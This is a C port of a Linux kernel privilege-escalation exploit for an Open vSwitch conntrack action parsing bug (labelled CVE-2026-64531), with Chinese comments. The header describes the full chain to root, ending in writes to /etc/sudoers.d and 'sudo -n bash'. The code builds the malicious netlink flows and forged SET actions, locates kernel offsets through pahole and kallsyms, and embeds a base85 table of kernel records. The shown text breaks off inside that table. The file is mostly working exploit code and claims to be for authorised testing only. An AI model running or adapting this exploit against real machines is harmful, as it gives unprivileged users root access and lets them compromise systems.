/*
 * CVE-2026-64531  net/openvswitch：CT action 解析越界 -> 伪造 SET action
 *
 * 这是 ovswrap-poc.py 的 C 移植版，用于并进 GUI 的单二进制引擎。
 * 攻击面与 Python 原版完全一致：
 *
 *   非特权用户 -> unshare(CLONE_NEWUSER|CLONE_NEWNET)
 *              -> 在私有 netns 里建 OVS datapath（netlink generic）
 *              -> 用 CLONE 把 400 个 CT action 塞进一条 flow
 *              -> OVS_CT_ATTR_LABELS / OVS_CT_ATTR_TIMEOUT 溢出到下一个
 *                 action 的边界，被当成 OVS_ACTION_ATTR_SET 解析
 *              -> fake SET 里的 OVS_KEY_ATTR_TUNNEL_INFO 指向任意
 *                 ip_tunnel_info，读取时把目标内存回显到 tunnel key 里
 *              -> 写原语是 dst_release()：对伪造的 dst_entry 递减引用计数，
 *                 一次 -1，可以对 cred 的 fsuid/fsgid 连续递减到 0
 *              -> 被改成 root 身份的 host 子进程写 /etc/sudoers.d
 *              -> sudo -n bash
 *
 * 与 Python 版的差异：
 *   1. 808 条预置内核记录表仍然带上，但换成了紧凑二进制 + base85：
 *      原始表是 1.1MB JSON（b85+zlib），这里去重后约 65KB，运行时只做
 *      base85 解码，不依赖 zlib。命中预置表就不再需要 BTF / pahole /
 *      System.map；没命中才回退到动态推导。
 *   2. 不再 exec 自身进 namespace，直接 unshare(2)。
 *   3. 所有 netlink 报文用内存缓冲区拼，不再依赖 struct 序列化。
 *
 * 仅用于自有机器或明确授权的测试环境。
 */

#define _GNU_SOURCE

#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <pwd.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define OVSWRAP_VERSION "0.1"

/* -------------------------------------------------------------------------
 * 常量
 * ---------------------------------------------------------------------- */

#define NLM_F_REQUEST 0x01
#define NLM_F_ACK     0x04
#define NLM_F_CREATE  0x400
#define NETLINK_GENERIC 16
#define GENL_ID_CTRL  0x10
#define CTRL_CMD_GETFAMILY 3
#define CTRL_ATTR_FAMILY_ID 1
#define CTRL_ATTR_FAMILY_NAME 2

#define OVS_DATAPATH_VERSION 2
#define OVS_FLOW_VERSION 1

#define OVS_DP_CMD_NEW 1
#define OVS_DP_ATTR_NAME 1
#define OVS_DP_ATTR_UPCALL_PID 2
#define OVS_DP_ATTR_USER_FEATURES 5

#define OVS_FLOW_CMD_NEW 1
#define OVS_FLOW_CMD_DEL 2
#define OVS_FLOW_CMD_GET 3
#define OVS_FLOW_ATTR_KEY 1
#define OVS_FLOW_ATTR_ACTIONS 2

#define OVS_KEY_ATTR_IN_PORT 3
#define OVS_KEY_ATTR_ETHERNET 4
#define OVS_KEY_ATTR_ETHERTYPE 6
#define OVS_KEY_ATTR_IPV4 7
#define OVS_KEY_ATTR_TCP 9
#define OVS_KEY_ATTR_TUNNEL 16
#define OVS_KEY_ATTR_TCP_FLAGS 18
/* 默认值；预置内核记录表给出别的值时用记录里的（历史版本是 29） */
#define OVS_KEY_ATTR_TUNNEL_INFO 31

#define OVS_ACTION_ATTR_OUTPUT 1
#define OVS_ACTION_ATTR_SET 3
#define OVS_ACTION_ATTR_POP_VLAN 5
#define OVS_ACTION_ATTR_CT 12
#define OVS_ACTION_ATTR_CLONE 20

#define OVS_CT_ATTR_COMMIT 1
#define OVS_CT_ATTR_LABELS 4
#define OVS_CT_ATTR_HELPER 5
#define OVS_CT_ATTR_TIMEOUT 9

#define OVS_TUNNEL_KEY_ATTR_IPV4_SRC 1
#define OVS_TUNNEL_KEY_ATTR_IPV4_DST 2
#define OVS_TUNNEL_KEY_ATTR_TOS 3
#define OVS_TUNNEL_KEY_ATTR_TTL 4
#define OVS_TUNNEL_KEY_ATTR_TP_SRC 9
#define OVS_TUNNEL_KEY_ATTR_TP_DST 10
#define OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE 16

#define ETH_P_IP 0x0800
#define IPPROTO_TCP 6
#define CT_ACTION_COUNT 400
#define NLA_HDR_LEN 4

#define BTF_VMLINUX "/sys/kernel/btf/vmlinux"

/* -------------------------------------------------------------------------
 * 日志：和 GUI 的 ANSI 解析器保持同一套颜色
 * ---------------------------------------------------------------------- */

static int g_color = 1;
/* fake SET 里 OVS_KEY_ATTR_TUNNEL_INFO 的 attr id：预置表命中时会被改写 */
static int g_tun_info = OVS_KEY_ATTR_TUNNEL_INFO;

#define C_RST "\033[0m"
#define C_DIM "\033[2m"
#define C_CYA "\033[36m"
#define C_GRN "\033[32m"
#define C_YEL "\033[33m"
#define C_RED "\033[31m"
#define C_MAG "\033[35m"

static void pr_raw(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static void pr_dim(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_DIM, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_err(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_RED, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_ok(const char *fmt, ...)
{
    va_list ap;

    if (g_color)
        fputs(C_GRN, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_RST, stdout);
    fflush(stdout);
}

static void pr_step(const char *fmt, ...)
{
    va_list ap;

    pr_raw("\n");
    if (g_color)
        fputs(C_MAG "***" C_RST, stdout);
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
    if (g_color)
        fputs(C_MAG "***" C_RST "\n", stdout);
    else
        pr_raw("\n");
    fflush(stdout);
}

/* -------------------------------------------------------------------------
 * 动态缓冲区：所有 netlink 报文都拼在这里
 * ---------------------------------------------------------------------- */

struct buf {
    unsigned char *p;
    size_t len;
    size_t cap;
};

static void buf_init(struct buf *b, size_t cap)
{
    b->p = malloc(cap);
    b->len = 0;
    b->cap = b->p ? cap : 0;
}

static void buf_free(struct buf *b)
{
    free(b->p);
    b->p = NULL;
    b->len = b->cap = 0;
}

static int buf_reserve(struct buf *b, size_t extra)
{
    size_t need = b->len + extra;

    if (need <= b->cap)
        return 0;
    while (b->cap < need)
        b->cap = b->cap ? b->cap * 2 : 4096;
    b->p = realloc(b->p, b->cap);
    return b->p ? 0 : -1;
}

static void buf_put(struct buf *b, const void *data, size_t len)
{
    if (buf_reserve(b, len) != 0)
        return;
    memcpy(b->p + b->len, data, len);
    b->len += len;
}

static void buf_u16(struct buf *b, uint16_t v)
{
    buf_put(b, &v, 2);
}

static void buf_u32(struct buf *b, uint32_t v)
{
    buf_put(b, &v, 4);
}

static void buf_align4(struct buf *b)
{
    static const unsigned char zero[4];

    while (b->len & 3)
        buf_put(b, zero, 1);
}

/* 追加一个 netlink attribute，长度自动回填 */
static size_t nla_put(struct buf *b, uint16_t type, const void *data, size_t len)
{
    size_t start = b->len;
    uint16_t total = (uint16_t)(NLA_HDR_LEN + len);

    buf_u16(b, total);
    buf_u16(b, type);
    if (len)
        buf_put(b, data, len);
    buf_align4(b);
    return start;
}

/* 嵌套 attribute：先占 4 字节，填完再回填长度 */
static size_t nla_nest_start(struct buf *b, uint16_t type)
{
    size_t start = b->len;

    buf_u16(b, 0);
    buf_u16(b, type);
    return start;
}

static void nla_nest_end(struct buf *b, size_t start)
{
    uint16_t total = (uint16_t)(b->len - start);

    memcpy(b->p + start, &total, 2);
    buf_align4(b);
}

/* -------------------------------------------------------------------------
 * generic netlink
 * ---------------------------------------------------------------------- */

struct genl {
    int fd;
    uint32_t seq;
};

static int genl_open(struct genl *g)
{
    struct sockaddr_nl sa;

    g->fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (g->fd < 0)
        return -1;
    memset(&sa, 0, sizeof(sa));
    sa.nl_family = AF_NETLINK;
    if (bind(g->fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(g->fd);
        g->fd = -1;
        return -1;
    }
    g->seq = 1;
    return 0;
}

/*
 * 发一条 generic netlink 请求并取回所有同 seq 的应答。
 * ack_mode: 1 = 期待 NLMSG_ERROR(0) 才算完成（NLM_F_ACK）
 */
static int genl_xchg(struct genl *g, int family, uint8_t cmd, uint8_t version,
                     const void *payload, size_t plen, int flags,
                     struct buf *reply)
{
    struct buf msg;
    struct nlmsghdr *nh;
    struct genlmsghdr {
        uint8_t cmd;
        uint8_t version;
        uint16_t reserved;
    } gh;
    uint32_t seq = g->seq++;
    unsigned char rx[1 << 16];
    int want_ack = (flags & NLM_F_ACK) != 0;
    int got_any = 0;

    if (reply)
        reply->len = 0;

    buf_init(&msg, 64 + plen);
    if (!msg.p) {
        buf_free(&msg);
        return -ENOMEM;
    }

    buf_u32(&msg, 0);                      /* len 稍后回填 */
    buf_u16(&msg, (uint16_t)family);
    buf_u16(&msg, (uint16_t)flags);
    buf_u32(&msg, seq);
    buf_u32(&msg, 0);

    gh.cmd = cmd;
    gh.version = version;
    gh.reserved = 0;
    buf_put(&msg, &gh, sizeof(gh));
    if (plen)
        buf_put(&msg, payload, plen);

    {
        uint32_t total = (uint32_t)msg.len;

        memcpy(msg.p, &total, 4);
    }

    nh = (struct nlmsghdr *)msg.p;
    (void)nh;

    if (send(g->fd, msg.p, msg.len, 0) < 0) {
        int e = errno;

        buf_free(&msg);
        return -e;
    }
    buf_free(&msg);

    for (;;) {
        ssize_t n = recv(g->fd, rx, sizeof(rx), 0);
        size_t off = 0;

        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }

        while (off + 16 <= (size_t)n) {
            const struct nlmsghdr *h = (const struct nlmsghdr *)(rx + off);
            size_t mlen = h->nlmsg_len;
            const unsigned char *body;
            size_t blen;

            if (mlen < 16 || off + mlen > (size_t)n)
                break;
            if (h->nlmsg_seq != seq) {
                off += NLMSG_ALIGN(mlen);
                continue;
            }

            body = rx + off + 16;
            blen = mlen - 16;

            if (h->nlmsg_type == NLMSG_ERROR) {
                int err = 0;

                if (blen >= 4)
                    memcpy(&err, body, 4);
                if (err == 0) {
                    if (want_ack || got_any)
                        return 0;
                    return 0;
                }
                return err;            /* 负数 errno */
            }

            if (reply && h->nlmsg_type != NLMSG_NOOP)
                buf_put(reply, body, blen);
            got_any = 1;
            off += NLMSG_ALIGN(mlen);
        }

        /* 不带 ACK 的请求：收到一条应答就可以返回 */
        if (!want_ack && got_any)
            return 0;
    }
}

static int genl_get_family(struct genl *g, const char *name, int *out)
{
    struct buf payload, reply;
    int ret;

    buf_init(&payload, 64);
    buf_init(&reply, 4096);
    if (!payload.p || !reply.p) {
        buf_free(&payload);
        buf_free(&reply);
        return -ENOMEM;
    }

    nla_put(&payload, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);

    ret = genl_xchg(g, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 2,
                    payload.p, payload.len, NLM_F_REQUEST, &reply);
    buf_free(&payload);
    if (ret < 0) {
        buf_free(&reply);
        return ret;
    }

    /* reply 是 genlmsghdr(4) + attrs */
    {
        size_t off = 4;
        int found = 0;

        while (off + 4 <= reply.len) {
            uint16_t alen, atype;

            memcpy(&alen, reply.p + off, 2);
            memcpy(&atype, reply.p + off + 2, 2);
            if (alen < 4 || off + alen > reply.len)
                break;
            if (atype == CTRL_ATTR_FAMILY_ID && alen >= 6) {
                uint16_t id;

                memcpy(&id, reply.p + off + 4, 2);
                *out = id;
                found = 1;
                break;
            }
            off += (alen + 3) & ~3u;
        }
        buf_free(&reply);
        return found ? 0 : -ENOENT;
    }
}

/* -------------------------------------------------------------------------
 * OVS 报文构造
 * ---------------------------------------------------------------------- */

/* 一条 flow 的 key：固定 IPv4/TCP 五元组，seq 只用来避免重复 */
static void flow_key(struct buf *out, int seq)
{
    uint32_t src = 0x0A000000u | (uint32_t)((seq & 0xFFFF) + 1);
    uint32_t dst = 0x0A0000FEu;
    uint16_t sport = (uint16_t)(10000 + (seq % 50000));
    uint16_t dport = 443;
    uint16_t ethertype = ETH_P_IP;
    uint16_t tcpflags = 0;
    uint32_t in_port = 0;
    unsigned char eth[12] = { 0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2 };
    unsigned char ipv4[12];
    unsigned char tcp[4];

    memcpy(ipv4 + 0, &src, 4);
    memcpy(ipv4 + 4, &dst, 4);
    ipv4[8] = IPPROTO_TCP;
    ipv4[9] = 0;
    ipv4[10] = 64;
    ipv4[11] = 0;

    memcpy(tcp + 0, &sport, 2);
    memcpy(tcp + 2, &dport, 2);

    nla_put(out, OVS_KEY_ATTR_IN_PORT, &in_port, 4);
    nla_put(out, OVS_KEY_ATTR_ETHERNET, eth, sizeof(eth));
    nla_put(out, OVS_KEY_ATTR_ETHERTYPE, &ethertype, 2);
    nla_put(out, OVS_KEY_ATTR_IPV4, ipv4, sizeof(ipv4));
    nla_put(out, OVS_KEY_ATTR_TCP, tcp, sizeof(tcp));
    nla_put(out, OVS_KEY_ATTR_TCP_FLAGS, &tcpflags, 2);
}

/* OVS_ACTION_ATTR_CT{ COMMIT, extra... } */
static void ct_action(struct buf *out, const void *extra, size_t elen)
{
    size_t nest = nla_nest_start(out, OVS_ACTION_ATTR_CT);

    nla_put(out, OVS_CT_ATTR_COMMIT, NULL, 0);
    if (elen)
        buf_put(out, extra, elen);
    nla_nest_end(out, nest);
}

/*
 * helper 泄漏：labels 里塞一个假的 OUTPUT action（len=512），
 * 后面紧跟 400 个 CT{COMMIT, HELPER}。OVS 解析 labels 时会把
 * 紧邻内存当成 action 链继续读，fake OUTPUT 的 512 字节 payload
 * 就会被原样回显到 flow get 的应答里 —— 里面是 nf_conntrack_helper。
 */
static void clone_with_helper_leak(struct buf *out, const void *fake, size_t flen)
{
    unsigned char labels[32];
    unsigned char helper_attr[8] = { 8, 0, OVS_CT_ATTR_HELPER, 0, 'f', 't', 'p', 0 };
    struct buf extra;
    size_t nest;
    int i;

    memset(labels, 0, sizeof(labels));
    if (flen > 32 - 20)
        flen = 32 - 20;
    memcpy(labels + 20, fake, flen);

    buf_init(&extra, 128);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_HELPER, helper_attr + 4, 4);   /* "ftp\0" */

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < CT_ACTION_COUNT; i++)
        ct_action(out, helper_attr, sizeof(helper_attr));
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/*
 * fake SET 载体 A：CT_ATTR_TIMEOUT。
 * timeout attr 的 32 字节 payload 里，前 4 字节会落到 "下一个 action" 的
 * nlattr 头上：len=0xFFFF, type=OVS_ACTION_ATTR_SET，于是解析器把后面的
 * 32 字节当成一个 SET，里面再套 TUNNEL_INFO(len=12)，指向 tun_dst。
 */
static void clone_with_fake_set_timeout(struct buf *out, uint64_t tun_dst)
{
    unsigned char labels[32];
    unsigned char timeout[32];
    struct buf extra;
    size_t nest;
    int i;

    memset(labels, 0, sizeof(labels));
    memset(timeout, 0, sizeof(timeout));

    /* labels[20..24] = {len=0xffff, type=SET} */
    labels[20] = 0xFF;
    labels[21] = 0xFF;
    labels[22] = OVS_ACTION_ATTR_SET;
    labels[23] = 0;
    /* labels[24..28] = {len=12, type=TUNNEL_INFO} */
    labels[24] = 12;
    labels[25] = 0;
    labels[26] = (unsigned char)g_tun_info;
    labels[27] = 0;
    /* labels[28..32] = tun_dst 低 32 位 */
    memcpy(labels + 28, &tun_dst, 4);

    /* timeout[0..4] = tun_dst 高 32 位 */
    memcpy(timeout, (const unsigned char *)&tun_dst + 4, 4);

    buf_init(&extra, 1024);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));
    nla_put(&extra, OVS_CT_ATTR_TIMEOUT, timeout, sizeof(timeout));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < CT_ACTION_COUNT; i++)
        ct_action(out, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

/* labels-only 计划的参数：把 total_ct 和 padding 数量算出来 */
static int labels_only_plan(int ct_action_len, int labels_off,
                            int *total_out, int *pad_out)
{
    int fake_offset = 16;
    int target_wrap;
    int best_score = -1, best_total = 0, best_pad = 0;
    int n;

    if (ct_action_len < 8 || (ct_action_len & 3))
        return -1;

    target_wrap = 8 + labels_off + fake_offset;
    if (target_wrap >= 0x10000 || (target_wrap & 3))
        return -1;

    for (n = 360; n <= 420; n++) {
        int base_wrap = (4 + n * ct_action_len) & 0xFFFF;
        int diff = (target_wrap - base_wrap) & 0xFFFF;
        int pad_count = diff / 4;
        int true_len = 4 + n * ct_action_len + pad_count * 4;
        int score;

        if (true_len <= 0xFFFF || pad_count > 256)
            continue;
        score = pad_count + abs(n - 400);
        if (best_score < 0 || score < best_score) {
            best_score = score;
            best_total = n;
            best_pad = pad_count;
        }
    }

    if (best_score < 0)
        return -1;
    *total_out = best_total;
    *pad_out = best_pad;
    return 0;
}

/*
 * fake SET 载体 B：只用 LABELS。
 * 这里不靠"下一个 attr"，而是让整个 clone 的 action 总长度超过 0xFFFF，
 * 被内核截断成 16 位长度后回绕到 labels 内部，fake SET 正好落在
 * labels+16 的位置。补若干个 POP_VLAN 把长度凑到目标回绕点。
 */
static void clone_with_fake_set_labels_only(struct buf *out, uint64_t tun_dst,
                                            int ct_action_len, int labels_off)
{
    int total = 0, pad = 0;
    int fake_offset = 16;
    unsigned char labels[32];
    struct buf extra;
    size_t nest;
    int i;

    if (labels_only_plan(ct_action_len, labels_off, &total, &pad) != 0)
        return;

    memset(labels, 0, sizeof(labels));
    labels[fake_offset + 0] = 0xFF;
    labels[fake_offset + 1] = 0xFF;
    labels[fake_offset + 2] = OVS_ACTION_ATTR_SET;
    labels[fake_offset + 3] = 0;
    labels[fake_offset + 4] = 12;
    labels[fake_offset + 5] = 0;
    labels[fake_offset + 6] = (unsigned char)g_tun_info;
    labels[fake_offset + 7] = 0;
    memcpy(labels + fake_offset + 8, &tun_dst, 8);

    buf_init(&extra, 64);
    nla_put(&extra, OVS_CT_ATTR_LABELS, labels, sizeof(labels));

    nest = nla_nest_start(out, OVS_ACTION_ATTR_CLONE);
    ct_action(out, extra.p, extra.len);
    for (i = 1; i < total; i++)
        ct_action(out, NULL, 0);
    for (i = 0; i < pad; i++)
        nla_put(out, OVS_ACTION_ATTR_POP_VLAN, NULL, 0);
    nla_nest_end(out, nest);
    buf_free(&extra);
}

enum carrier {
    CARRIER_TIMEOUT = 0,
    CARRIER_LABELS_ONLY = 1,
    CARRIER_AUTO = 2,
};

static void clone_with_fake_set(struct buf *out, int carrier, uint64_t tun_dst,
                                int ct_action_len, int labels_off)
{
    if (carrier == CARRIER_TIMEOUT)
        clone_with_fake_set_timeout(out, tun_dst);
    else
        clone_with_fake_set_labels_only(out, tun_dst, ct_action_len, labels_off);
}

/* -------------------------------------------------------------------------
 * 内核偏移：pahole 读 BTF，符号读 kallsyms / System.map
 * ---------------------------------------------------------------------- */

struct koffs {
    unsigned long vmlinux_module_ktype;   /* module_ktype - _text */
    unsigned long vmlinux_init_pid_ns;    /* init_pid_ns  - _text */

    int nf_conntrack_helper_me;
    int module_kobj_ktype;
    int task_pid;
    int task_cred;
    int task_pid_links;
    int cred_fsuid;
    int cred_fsgid;
    int cred_cap_permitted;
    int cred_cap_effective;
    int pid_namespace_idr;
    int idr_idr_rt;
    int idr_base;
    int xarray_xa_head;
    int xa_node_shift;
    int xa_node_slots;
    int pid_tasks;
    int hlist_head_first;
    int dst_entry_ref;
    int ref_kind;                  /* 0 = __rcuref, 1 = __refcnt */
    int metadata_dst_tun_info;
    int ip_tunnel_key_ipv4_src;
    int ip_tunnel_key_ipv4_dst;
    int ip_tunnel_key_tos;
    int ip_tunnel_key_ttl;
    int ip_tunnel_key_tp_src;
    int ip_tunnel_key_tp_dst;
    int ovs_ct_labels;
    int ovs_ct_action_len;
};

static int g_verbose;

static int run_cmd(const char *cmd, char *out, size_t outlen)
{
    FILE *f;
    size_t n;

    f = popen(cmd, "r");
    if (!f)
        return -1;
    n = fread(out, 1, outlen - 1, f);
    out[n] = '\0';
    pclose(f);
    return (int)n;
}

static int have_binary(const char *name)
{
    const char *path = getenv("PATH");
    char buf[1024];
    const char *p;

    if (!path)
        path = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

    p = path;
    while (*p) {
        const char *q = strchr(p, ':');
        size_t len = q ? (size_t)(q - p) : strlen(p);

        if (len && len < sizeof(buf) - 64) {
            snprintf(buf, sizeof(buf), "%.*s/%s", (int)len, p, name);
            if (access(buf, X_OK) == 0)
                return 1;
        }
        if (!q)
            break;
        p = q + 1;
    }
    return 0;
}

/*
 * pahole -C <type> <btf> 的输出里，字段行形如：
 *      int                        pid;                  / *     0     4 * /
 * 我们只要这条注释里的第一个数。
 */
static int parse_field_offset(const char *text, const char *type,
                              const char *field, int *out)
{
    const char *line = text;
    size_t flen = strlen(field);

    (void)type;

    while (line && *line) {
        const char *nl = strchr(line, '\n');
        size_t len = nl ? (size_t)(nl - line) : strlen(line);
        char tmp[512];
        const char *hit = NULL;
        const char *p;

        if (len >= sizeof(tmp))
            len = sizeof(tmp) - 1;
        memcpy(tmp, line, len);
        tmp[len] = '\0';

        /* 在行内找 field，且前后必须是"标识符边界" */
        for (p = tmp; (p = strstr(p, field)) != NULL; p += flen) {
            char before = (p == tmp) ? ' ' : p[-1];
            char after = p[flen];

            if ((before == ' ' || before == '\t' || before == '*' ||
                 before == ')' || before == '(') &&
                (after == ';' || after == '[' || after == ')' ||
                 after == ' ' || after == '\t')) {
                hit = p;
                break;
            }
        }

        if (hit && strstr(tmp, "/*")) {
            const char *c = strstr(tmp, "/*");
            int off = -1, size = -1;

            if (sscanf(c, "/* %d %d", &off, &size) == 2 && off >= 0) {
                *out = off;
                return 0;
            }
        }

        line = nl ? nl + 1 : NULL;
    }
    return -1;
}

/*
 * 结构体可能不在 vmlinux 里：nf_conntrack_helper 在 nf_conntrack 模块，
 * ovs_conntrack_info 在 openvswitch 模块。所以按 vmlinux -> btf 目录下
 * 每个模块文件的顺序挨个试，记住上次命中的文件，下次先试它。
 */
#define BTF_DIR "/sys/kernel/btf"
#define BTF_MAX 320

static char g_btf_paths[BTF_MAX][256];
static int g_btf_count;
static int g_btf_pref = -1;

static void btf_collect(void)
{
    DIR *d;
    struct dirent *e;
    char release[128], path[256];

    if (g_btf_count)
        return;

    snprintf(g_btf_paths[g_btf_count++], 256, "%s", BTF_VMLINUX);

    d = opendir(BTF_DIR);
    if (d) {
        while ((e = readdir(d)) != NULL && g_btf_count < BTF_MAX) {
            if (e->d_name[0] == '.' || !strcmp(e->d_name, "vmlinux"))
                continue;
            snprintf(g_btf_paths[g_btf_count++], 256, "%s/%.200s", BTF_DIR, e->d_name);
        }
        closedir(d);
    }

    if (run_cmd("uname -r", release, sizeof(release)) > 0) {
        release[strcspn(release, "\n")] = '\0';
        snprintf(path, sizeof(path), "/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
        snprintf(path, sizeof(path), "/usr/lib/debug/boot/vmlinux-%s", release);
        if (access(path, R_OK) == 0 && g_btf_count < BTF_MAX)
            snprintf(g_btf_paths[g_btf_count++], 256, "%s", path);
    }
}

static int pahole_dump(const char *type, char *out, size_t outlen)
{
    char cmd[1024];
    int i, tried = 0;

    btf_collect();

    for (i = -1; i < g_btf_count; i++) {
        int idx = (i < 0) ? g_btf_pref : i;

        if (idx < 0 || idx >= g_btf_count)
            continue;
        if (i >= 0 && idx == g_btf_pref)
            continue;               /* 刚才已经试过 */
        tried++;

        snprintf(cmd, sizeof(cmd), "pahole -C %s %s 2>/dev/null",
                 type, g_btf_paths[idx]);
        if (run_cmd(cmd, out, outlen) <= 0)
            continue;
        if (!strstr(out, "struct ") && !strstr(out, "union "))
            continue;
        g_btf_pref = idx;
        return 0;
    }

    if (!tried)
        return -1;
    return -1;
}

static int koff_field(const char *type, const char *field, int *out)
{
    static char text[1 << 16];
    static char cached_type[64];
    static int cached = -1;

    if (!cached_type[0] || strcmp(cached_type, type)) {
        cached = pahole_dump(type, text, sizeof(text));
        snprintf(cached_type, sizeof(cached_type), "%s", type);
    }
    if (cached != 0) {
        pr_err("  pahole 读不到 struct %s（%s）\n", type, BTF_VMLINUX);
        return -1;
    }
    if (parse_field_offset(text, type, field, out) != 0) {
        pr_err("  struct %s 里找不到字段 %s\n", type, field);
        return -1;
    }
    return 0;
}

static int koff_struct_size(const char *type, int *out)
{
    static char text[1 << 16];
    const char *p;

    if (pahole_dump(type, text, sizeof(text)) != 0) {
        pr_err("  pahole 读不到 struct %s\n", type);
        return -1;
    }
    p = strstr(text, "size:");
    if (!p || sscanf(p, "size: %d", out) != 1) {
        pr_err("  struct %s 的 size 解析失败\n", type);
        return -1;
    }
    return 0;
}

/* 从 kallsyms / System.map 取三个符号的绝对地址 */
static int read_symbol_triplet(const char *path, unsigned long *text,
                               unsigned long *mtype, unsigned long *pidns)
{
    FILE *f = fopen(path, "r");
    char line[512];
    int got = 0;

    if (!f)
        return -1;

    *text = *mtype = *pidns = 0;

    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type, name[256];

        if (sscanf(line, "%lx %c %255s", &addr, &type, name) != 3)
            continue;
        if (!strcmp(name, "_text")) {
            *text = addr;
            got |= 1;
        } else if (!strcmp(name, "module_ktype")) {
            *mtype = addr;
            got |= 2;
        } else if (!strcmp(name, "init_pid_ns")) {
            *pidns = addr;
            got |= 4;
        }
        if (got == 7)
            break;
    }
    fclose(f);

    if (got != 7 || !*text || !*mtype || !*pidns)
        return -1;
    return 0;
}

static int derive_symbols(struct koffs *k)
{
    char release[128];
    char path[512];
    unsigned long text = 0, mtype = 0, pidns = 0;
    static const char *fixed[] = {
        "/boot/System.map", "/proc/kallsyms",
    };
    int i;

    {
        char cmd[256];

        if (run_cmd("uname -r", release, sizeof(release)) <= 0)
            return -1;
        release[strcspn(release, "\n")] = '\0';
        (void)cmd;
    }

    snprintf(path, sizeof(path), "/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    for (i = 0; i < (int)(sizeof(fixed) / sizeof(fixed[0])); i++) {
        if (read_symbol_triplet(fixed[i], &text, &mtype, &pidns) == 0)
            goto done;
    }

    snprintf(path, sizeof(path), "/usr/lib/debug/boot/System.map-%s", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    snprintf(path, sizeof(path), "/lib/modules/%s/build/System.map", release);
    if (read_symbol_triplet(path, &text, &mtype, &pidns) == 0)
        goto done;

    return -1;

done:
    if (mtype <= text || pidns <= text) {
        pr_err("  符号地址异常：_text=0x%lx module_ktype=0x%lx init_pid_ns=0x%lx\n",
               text, mtype, pidns);
        return -1;
    }
    k->vmlinux_module_ktype = mtype - text;
    k->vmlinux_init_pid_ns = pidns - text;
    return 0;
}

/* -------------------------------------------------------------------------
 * 预置内核记录表
 *
 * 原版 Python 把 808 条记录存成 base85 + zlib + JSON（1.1MB）。这里由
 * tools/gen_krec_table.py 去重成紧凑二进制（offsets 266 组 / carrier+lane
 * 组合 17 组 / release 字符串池），再用 base85 编成字符串常量。
 * 命中预置表就完全不需要 BTF / pahole / System.map。
 *
 * 二进制布局见 tools/gen_krec_table.py 顶部注释。
 * ---------------------------------------------------------------------- */

#define KREC_OFF_STRIDE 63
#define KREC_REC_STRIDE 12
#define KREC_LANE_MAX 14

struct krec {
    unsigned char *storage;
    size_t pool_len;
    const unsigned char *off_tab;
    const unsigned char *combo_tab;
    const unsigned char *rec_tab;
    const char *pool;
    unsigned n_rec;
    unsigned n_off;
    unsigned n_combo;
    int state;                 /* 0 未载入 / 1 可用 / -1 数据损坏 */
};

struct krec_hit {
    int hit;
    int exact;
    int read_carrier;
    int write_carrier;
    int tunnel_info;
    int lane_count;
    int lane_order[KREC_LANE_MAX];
    char release[128];
};

static struct krec g_krec;
static struct krec_hit g_krec_hit;
static int g_force_derive;
static const char *g_krec_force;   /* -krec <release>：手动指定记录 */

/* BEGIN KREC: 由 tools/gen_krec_table.py 生成, 不要手改 */
#define KREC_B85_LEN 52987
static const char krec_b85[] =
    "PfJoUC<6)s5dZ-IaXkP4C;)f>xC*!oC<`0_AOJ7`H~;_u000mG2mk;8C;$)u002M$-~b2!3;;L)IRH8UJOC&FqyXSy1Ob4K<"
    "pBUF0C)hn3b+g?3mgC-05AYJ0000001yBO0000e05|{u06+lX00;mK05||S06G9X04M;Y0DxTt0brKp0RSifcmTKxxC|%@8~"
    "`8yFaS6J000005C8}O001ZeH~;_uKmgzX2mlNKH~={SIsiNXC;+4Y09^zDV3y?p04M->0JsXc3@8g603ZM`05|{u0000G00;"
    "m804M-B0000$0N?-!01N;)0673U06YLF0HgrmTm%7NmgNBeC;)f>xC*!oC<`0_AOJ7`H~;_u000mG2mk;8C;&JB002M$-~b2"
